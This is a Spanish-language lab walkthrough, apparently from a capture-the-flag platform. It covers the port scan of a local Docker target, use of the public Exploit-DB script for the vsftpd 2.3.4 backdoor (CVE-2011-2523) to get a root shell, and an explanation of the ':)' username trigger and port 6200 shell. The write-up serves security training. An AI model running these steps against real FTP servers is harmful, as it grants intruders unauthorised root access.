
## Escaneo de Puertos

```bash
nmap -sVC -p- --open 172.17.0.2
``` 
Listamos con **nmap** los siguientes puertos:
```bash
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-19 16:54 +0200
Nmap scan report for 172.17.0.2
Host is up (0.0000050s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
|_ftp-anon: got code 500 "OOPS: cannot change directory:/var/ftp".
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: EE:B9:DB:C5:CD:BE (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.47 seconds
```

## Análisis de puertos y versiones

Si analizamos de primeras el output veremos que tenemos algo muy interesante, el puerto 21 (**ftp**) esta utilizando una versión antigua "**vstftpd 2.3.4**" por lo que es probable que de esta exista un CVE.

En este caso hay una herramienta muy útil que Kali trae por defecto llamada "**searchsploit**", con esta buscaremos de manera rápida si existe algún exploit que ya tengamos instalado en el sistema.
```bash
[16:54:58] bapee@BlumeSec ~/Escritorio/tproot ❯ searchsploit vsftpd 2.3.4  
-----------------------------------------------------------------------------------
Exploit Title                                         Path

vsftpd 2.3.4 - Backdoor Command Execution              unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit) unix/remote/17491.rb
```

Una vez vemos esto el que nos interesa es el **.py "Python"**, entonces vamos a proceder a descargarlo a nuestro directorio actual.

## Descarga de exploit y uso de este

Con el siguiente comando descargaremos el **exploit** antes visto para traerlo a nuestro directorio actual.
```bash
bapee@BlumeSec ~/Escritorio/tproot ❯ searchsploit -m unix/remote/49757.py

  Exploit: vsftpd 2.3.4 - Backdoor Command Execution
      URL: https://www.exploit-db.com/exploits/49757
     Path: /usr/share/exploitdb/exploits/unix/remote/49757.py
    Codes: CVE-2011-2523
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/bapee/Escritorio/tproot/49757.py
```

Ahora vamos a utilizarlo  de la siguiente manera:
```bash
[17:34:07] bapee@BlumeSec ~/Escritorio/tproot ❯ python3 49757.py 172.17.0.2
```

Una vez se ejecute si todo ha salido bien nos saldrá esto:
```bash
Success, shell opened
Send `exit` to quit shell
 <-- Aqui estas tu " Aunque no veas nada si pones whoami te devolvera (root) "
```

Con esta **shell** conseguida, vamos a utilizar este comando para mejorarnos la **shell** de manera grafica:
```bash
script /dev/null -c bash 
Script started, output log file is '/dev/null'.

root@dockerlabs:/tmp/vsftpd-2.3.4-infected> whoami
root
```

Una vez tenemos bien la Shell, ya hemos conseguido acceso a root por lo que la maquina ha sido vulnerada con éxito!
```bash
root@dockerlabs:/tmp/vsftpd-2.3.4-infected> id
uid=0(root) gid=0(root) groups=0(root)
root@dockerlabs:/tmp/vsftpd-2.3.4-infected> whoami
root
```

## Análisis del exploit vsFTPd 2.3.4 Backdoor

El script explota la **vulnerabilidad** **vsftpd** 2.3.4 **Backdoor** Incident asociada al **CVE-2011-2523**.

La versión comprometida de **vsftpd** contenía una puerta trasera introducida maliciosamente en el código fuente oficial.  
Cuando un usuario se autenticaba usando un nombre que contenía `:)`, el servicio abría un **shell** remoto en el **puerto** **TCP** `6200`.
El **exploit** automatiza ese proceso.

El flujo del exploit es:
1. Conectarse al servicio FTP vulnerable.
2. Enviar un nombre de usuario con el trigger `:)`.
3. Activar el backdoor.
4. Conectarse al puerto `6200`.
5. Obtener una shell interactiva remota.

